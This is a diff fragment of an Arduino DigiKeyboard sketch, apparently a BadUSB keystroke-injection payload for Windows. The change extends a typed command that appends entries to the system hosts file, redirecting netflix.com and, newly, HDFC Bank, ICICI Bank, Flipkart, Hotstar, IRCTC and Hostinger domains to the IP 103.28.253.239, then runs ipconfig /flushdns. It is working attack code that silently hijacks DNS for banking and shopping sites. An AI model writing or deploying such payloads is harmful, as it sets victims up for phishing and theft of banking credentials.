@@ -34,7 +34,7 @@ void loop() {
     }
   DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("(echo. && echo 103.28.253.239 www.netflix.com netflix.com) >> c:/windows/system32/drivers/etc/hosts");
+  DigiKeyboard.println("(echo. && echo 103.28.253.239 www.netflix.com netflix.com www.hostinger.in hostinger.in www.flipkart.com flipkart.com www.hotstar.com hotstar.com www.hdfcbank.com hdfcbank.com www.icicibank.com icicibank.com www.irctc.co.in irctc.co.in) >> c:/windows/system32/drivers/etc/hosts");
   DigiKeyboard.delay(500);
   DigiKeyboard.println("ipconfig /flushdns");
   DigiKeyboard.delay(200);
